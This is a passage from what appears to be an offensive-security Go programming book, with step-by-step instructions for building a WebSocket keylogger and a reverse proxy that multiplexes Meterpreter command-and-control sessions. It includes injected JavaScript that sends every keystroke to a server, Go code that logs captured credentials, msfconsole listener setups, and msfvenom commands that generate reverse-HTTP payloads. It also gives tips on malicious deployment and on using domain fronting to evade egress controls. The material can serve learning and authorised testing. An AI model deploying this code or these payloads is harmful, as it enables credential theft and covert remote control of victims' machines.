Go, not JavaScript. (Check out
https://github.com/gopherjs/gopherjs/ for instructions on
writing JavaScript with Go.) The JavaScript code is shown
here:
(function() {
var conn = new WebSocket("ws://{{.}}/ws");
document.onkeypress = keypress;
function keypress(evt) {
s = String.fromCharCode(evt.which);
conn.send(s);
}
})();
The JavaScript code handles keypress events. Each time a
key is pressed, the code sends the keystrokes over a
WebSocket to a resource at ws://{{.}}/ws. Recall that the {{.}}
value is a Go template placeholder representing the current
context. This resource represents a WebSocket URL that will
populate the server location information based on a string
you’ll pass to the template. We’ll get to that in a minute. For
this example, you’ll save the JavaScript in a file named
logger.js.
But wait, you say, we said we were serving it as k.js! The
HTML we showed previously also explicitly uses k.js. What
gives? Well, logger.js is a Go template, not an actual
JavaScript file. You’ll use k.js as your pattern to match against
in your router. When it matches, your server will render the
template stored in the logger.js file, complete with contextual
data that represents the host to which your WebSocket
connects. You can see how this works by looking at the server
code, shown in Listing 4-9.
import (
"flag"
"fmt"
"html/template"
"log"
"net/http"
"github.com/gorilla/mux"
❶ "github.com/gorilla/websocket"
)
var (
❷ upgrader = websocket.Upgrader{
CheckOrigin: func(r *http.Request) bool { return true },
}
listenAddr string
wsAddr string
jsTemplate *template.Template
)
func init() {
flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
flag.Parse()
var err error
❸ jsTemplate, err = template.ParseFiles("logger.js")
if err != nil {
panic(err)
}
}
func serveWS(w http.ResponseWriter, r *http.Request) {
❹ conn, err := upgrader.Upgrade(w, r, nil)
if err != nil {
http.Error(w, "", 500)
return
}
defer conn.Close()
fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
for {
❺ _, msg, err := conn.ReadMessage()
if err != nil {
return
}
❻ fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
}
}
func serveFile(w http.ResponseWriter, r *http.Request) {
❼ w.Header().Set("Content-Type", "application/javascript")
❽ jsTemplate.Execute(w, wsAddr)
}
func main() {
r := mux.NewRouter()
❾ r.HandleFunc("/ws", serveWS)
❿ r.HandleFunc("/k.js", serveFile)
log.Fatal(http.ListenAndServe(":8080", r))
}
Listing 4-9: Keylogging server (/ch-4/websocket_keylogger/main.go)
We have a lot to cover here. First, note that you’re using
another third-party package, gorilla/websocket, to handle your
WebSocket communications ❶. This is a full-featured,
powerful package that simplifies your development process,
like the gorilla/mux router you used earlier in this chapter. Don’t
forget to run go get github.com/gorilla/websocket from your terminal
first.
You then define several variables. You create a
websocket.Upgrader instance that’ll essentially whitelist every
origin ❷. It’s typically bad security practice to allow all
origins, but in this case, we’ll roll with it since this is a test
instance we’ll run on our local workstations. For use in an
actual malicious deployment, you’d likely want to limit the
origin to an explicit value.
Within your init() function, which executes automatically
before main(), you define your command line arguments and
attempt to parse your Go template stored in the logger.js file.
Notice that you’re calling template.ParseFiles("logger.js") ❸. You
check the response to make sure the file parsed correctly. If all
is successful, you have your parsed template stored in a
variable named jsTemplate.
At this point, you haven’t provided any contextual data to
your template or executed it. That’ll happen shortly. First,
however, you define a function named serveWS() that you’ll use
to handle your WebSocket communications. You create a new
websocket.Conn instance by calling upgrader.Upgrade(http.ResponseWriter,
*http.Request, http.Header) ❹. The Upgrade() method upgrades the
HTTP connection to use the WebSocket protocol. That means
that any request handled by this function will be upgraded to
use WebSockets. You interact with the connection within an
infinite for loop, calling conn.ReadMessage() to read incoming
messages ❺. If your JavaScript works appropriately, these
messages should consist of captured keystrokes. You write
these messages and the client’s remote IP address to stdout ❻.
You’ve tackled arguably the hardest piece of the puzzle in
creating your WebSocket handler. Next, you create another
handler function named serveFile(). This function will retrieve
and return the contents of your JavaScript template, complete
with contextual data included. To do this, you set the Content-
Type header as application/javascript ❼. This will tell connecting
browsers that the contents of the HTTP response body should
be treated as JavaScript. In the second and last line of the
handler function, you call jsTemplate.Execute(w, wsAddr) ❽.
Remember how you parsed logger.js while you were
bootstrapping your server in the init() function? You stored the
result within the variable named jsTemplate. This line of code
processes that template. You pass to it an io.Writer (in this case,
you’re using w, an http.ResponseWriter) and your contextual data of
type interface{}. The interface{} type means that you can pass any
type of variable, whether they’re strings, structs, or something
else. In this case, you’re passing a string variable named
wsAddr. If you jump back up to the init() function, you’ll see that
this variable contains the address of your WebSocket server
and is set via a command line argument. In short, it populates
the template with data and writes it as an HTTP response.
Pretty slick!
You’ve implemented your handler functions, serveFile() and
serveWS(). Now, you just need to configure your router to
perform pattern matching so that you can pass execution to the
appropriate handler. You do this, much as you have
previously, in your main() function. The first of your two
handler functions matches the /ws URL pattern, executing your
serveWS() function to upgrade and handle WebSocket
connections ❾. The second route matches the pattern /k.js,
executing the serveFile() function as a result ❿. This is how your
server pushes a rendered JavaScript template to the client.
Let’s fire up the server. If you open the HTML file, you
should see a message that reads connection established. This is
logged because your JavaScript file has been rendered in the
browser and requested a WebSocket connection. If you enter
credentials into the form elements, you should see them
printed to stdout on the server:
$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080
Connection from 127.0.0.1:58438
From 127.0.0.1:58438: u
From 127.0.0.1:58438: s
From 127.0.0.1:58438: e
From 127.0.0.1:58438: r
From 127.0.0.1:58438:
From 127.0.0.1:58438: p
From 127.0.0.1:58438: @
From 127.0.0.1:58438: s
From 127.0.0.1:58438: s
From 127.0.0.1:58438: w
From 127.0.0.1:58438: o
From 127.0.0.1:58438: r
From 127.0.0.1:58438: d
You did it! It works! Your output lists each individual
keystroke that was pressed when filling out the login form. In
this case, it’s a set of user credentials. If you’re having issues,
make sure you’re supplying accurate addresses as command
line arguments. Also, the HTML file itself may need tweaking
if you’re attempting to call k.js from a server other than
localhost:8080.
You could improve this code in several ways. For one, you
might want to log the output to a file or other persistent
storage, rather than to your terminal. This would make you
less likely to lose your data if the terminal window closes or
the server reboots. Also, if your keylogger logs the keystrokes
of multiple clients simultaneously, the output will mix the
data, making it potentially difficult to piece together a specific
user’s credentials. You could avoid this by finding a better
presentation format that, for example, groups keystrokes by
unique client/port source.
Your journey through credential harvesting is complete.
We’ll end this chapter by presenting multiplexing HTTP
command-and-control connections.
MULTIPLEXING COMMAND-AND-
CONTROL
You’ve arrived at the last section of the chapter on HTTP
servers. Here, you’ll look at how to multiplex Meterpreter
HTTP connections to different backend control servers.
Meterpreter is a popular, flexible command-and-control (C2)
suite within the Metasploit exploitation framework. We won’t
go into too many details about Metasploit or Meterpreter. If
you’re new to it, we recommend reading through one of the
many tutorial or documentation sites.
In this section, we’ll walk through creating a reverse HTTP
proxy in Go so that you can dynamically route your incoming
Meterpreter sessions based on the Host HTTP header, which is
how virtual website hosting works. However, instead of
serving different local files and directories, you’ll proxy the
connection to different Meterpreter listeners. This is an
interesting use case for a few reasons.
First, your proxy acts as a redirector, allowing you to
expose only that domain name and IP address without
exposing your Metasploit listeners. If the redirector ever gets
blacklisted, you can simply move it without having to move
your C2 server. Second, you can extend the concepts here to
perform domain fronting, a technique for leveraging trusted
third-party domains (often from cloud providers) to bypass
restrictive egress controls. We won’t go into a full-fledged
example here, but we highly recommend you dig into it, as it
can be pretty powerful, allowing you to egress restricted
networks. Lastly, the use case demonstrates how you can share
a single host/port combination among a team of allies
potentially attacking different target organizations. Since ports
80 and 443 are the most likely allowed egress ports, you can
use your proxy to listen on those ports and intelligently route
the connections to the correct listener.
Here’s the plan. You’ll set up two separate Meterpreter
reverse HTTP listeners. In this example, these will reside on a
virtual machine with an IP address of 10.0.1.20, but they could
very well exist on separate hosts. You’ll bind your listeners to
ports 10080 and 20080, respectively. In a real situation, these
listeners can be running anywhere so long as the proxy can
reach those ports. Make sure you have Metasploit installed (it
comes pre-installed on Kali Linux); then start your listeners.
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
❶ > set LHOST 10.0.1.20
> set LPORT 80
❷ > set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 10080
> exploit -j -z
[*] Exploit running as background job 1.
[*] Started HTTP reverse handler on http://10.0.1.20:10080
When you start your listener, you supply the proxy data as
the LHOST and LPORT values ❶. However, you set the
advanced options ReverseListenerBindAddress and
ReverseListenerBindPort to the actual IP and port on which you
want the listener to start ❷. This gives you some flexibility in
port usage while allowing you to explicitly identify the proxy
host—which may be a hostname, for example, if you were
setting up domain fronting.
On a second instance of Metasploit, you’ll do something
similar to start an additional listener on port 20080. The only
real difference here is that you’re binding to a different port:
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 20080
> exploit -j -z
[*] Exploit running as background job 1.
[*] Started HTTP reverse handler on http://10.0.1.20:20080
Now, let’s create your reverse proxy. Listing 4-10 shows
the code in its entirety.
package main
import (
"log"
"net/http"
❶ "net/http/httputil"
"net/url"
"github.com/gorilla/mux"
)
❷ var (
hostProxy = make(map[string]string)
proxies = make(map[string]*httputil.ReverseProxy)
)
func init() {
❸ hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
hostProxy["attacker2.com"] = "http://10.0.1.20:20080"
for k, v := range hostProxy {
❹ remote, err := url.Parse(v)
if err != nil {
log.Fatal("Unable to parse proxy target")
}
❺ proxies[k] = httputil.NewSingleHostReverseProxy(remote)
}
}
func main() {
r := mux.NewRouter()
for host, proxy := range proxies {
❻ r.Host(host).Handler(proxy)
}
log.Fatal(http.ListenAndServe(":80", r))
}
Listing 4-10: Multiplexing Meterpreter (/ch-4/multiplexer/main.go)
First off, you’ll notice that you’re importing the
net/http/httputil package ❶, which contains functionality to assist
with creating a reverse proxy. It’ll save you from having to
create one from scratch.
After you import your packages, you define a pair of
variables ❷. Both variables are maps. You’ll use the first,
hostProxy, to map hostnames to the URL of the Metasploit
listener to which you’ll want that hostname to route.
Remember, you’ll be routing based on the Host header that
your proxy receives in the HTTP request. Maintaining this
mapping is a simple way to determine destinations.
The second variable you define, proxies, will also use
hostnames as its key values. However, their corresponding
values in the map are *httputil.ReverseProxy instances. That is, the
values will be actual proxy instances to which you can route,
rather than string representations of the destination.
Notice that you’re hardcoding this information, which isn’t
the most elegant way to manage your configuration and proxy
data. A better implementation would store this information in
an external configuration file instead. We’ll leave that as an
exercise for you.
You use an init() function to define the mappings between
domain names and destination Metasploit instances ❸. In this
case, you’ll route any request with a Host header value of
attacker1.com to http://10.0.1.20:10080 and anything with a Host header
value of attacker2.com to http://10.0.1.20:20080. Of course, you aren’t
actually doing the routing yet; you’re just creating your
rudimentary configuration. Notice that the destinations
correspond to the ReverseListenerBindAddress and
ReverseListenerBindPort values you used for your Meterpreter
listeners earlier.
Next, still within your init() function, you loop over your
hostProxy map, parsing the destination addresses to create net.URL
instances ❹. You use the result of this as input into a call to
httputil.NewSingleHostReverseProxy(net.URL) ❺, which is a helper
function that creates a reverse proxy from a URL. Even better,
the httputil.ReverseProxy type satisfies the http.Handler interface,
which means you can use the created proxy instances as
handlers for your router. You do this within your main()
function. You create a router and then loop over all of your
proxy instances. Recall that the key is the hostname, and the
value is of type httputil.ReverseProxy. For each key/value pair in
your map, you add a matching function onto your router ❻.
The Gorilla MUX toolkit’s Route type contains a matching
function named Host that accepts a hostname to match Host
header values in incoming requests against. For each hostname
you want to inspect, you tell the router to use the
corresponding proxy. It’s a surprisingly easy solution to what
could otherwise be a complicated problem.
Your program finishes by starting the server, binding it to
port 80. Save and run the program. You’ll need to do so as a
privileged user since you’re binding to a privileged port.
At this point, you have two Meterpreter reverse HTTP
listeners running, and you should have a reverse proxy running
now as well. The last step is to generate test payloads to check
that your proxy works. Let’s use msfvenom, a payload generation
tool that ships with Metasploit, to generate a pair of Windows
executable files:
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20
LPORT=80
HttpHostHeader=attacker1.com -f exe -o payload1.exe
$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20
LPORT=80
HttpHostHeader=attacker2.com -f exe -o payload2.exe
This generates two output files named payload1.exe and
payload2.exe. Notice that the only difference between the two,
besides the output filename, is the HttpHostHeader values. This
ensures that the resulting payload sends its HTTP requests
with a specific Host header value. Also of note is that the LHOST
and LPORT values correspond to your reverse proxy
information and not your Meterpreter listeners. Transfer the
resulting executables to a Windows system or virtual machine.
When you execute the files, you should see two new sessions
established: one on the listener bound to port 10080, and one
on the listener bound to port 20080. They should look
something like this:
>
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk)
Redirecting stageless
connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-
3UdLhACr8-Qt6QOlOw
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA
'Mozilla/5.0 (Windows NT 6.1;
Trident/7.0;
rv:11.0) like Gecko'
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk)
Attaching
orphaned/stageless session...
[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-
03 16:13:34 -0500
If you use tcpdump or Wireshark to inspect network traffic
destined for port 10080 or 20080, you should see that your